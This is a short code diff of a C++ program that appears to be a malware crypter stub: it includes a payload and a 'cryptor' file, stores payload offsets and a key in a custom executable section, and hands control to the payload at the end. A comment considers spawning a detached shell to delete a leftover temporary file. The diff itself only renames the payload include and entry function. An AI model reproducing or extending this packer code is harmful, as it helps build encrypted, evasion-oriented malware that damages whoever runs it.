@@ -1,11 +1,8 @@
-// load payload first
-// libssh wants to be loaded before windows.h
-#include "../payload/entry.cpp"
-
+#include "../payload/payload.cpp"
+#include "cryptor.cpp"
 #include <windows.h>
 #include <iostream>
 #include <fstream>
-#include "cryptor.cpp"
 
 #pragma section(".replace", read)
 __declspec(allocate(".replace")) INT32 payload_offet_from_me = 1;
@@ -23,7 +20,7 @@ void print_program_information() {
 	printf("payload key: %u\n", payload_key);
 	printf("replace file addr: %u\n", replace_file_address);
 	printf("payload file address: %u\n", payload_file_address);
-	printf("payload func addr: %p\n", &start_payload);
+	printf("payload func addr: %p\n", &startPayload);
 	printf("computed start of payload: %p\n", payload_start_addr);
 	printf("computed end of payload: %p\n", payload_start_addr + payload_segment_length);
 }
@@ -107,5 +104,5 @@ int main(int argc, char const *argv[])
 	// TODO: we are currently leaving a temporary file around, I could maybe spawn a detached shell to destroy it tho
 	
 	// pass control to payload
-	return start_payload(argc, argv);
+	return startPayload(argc, argv);
 }
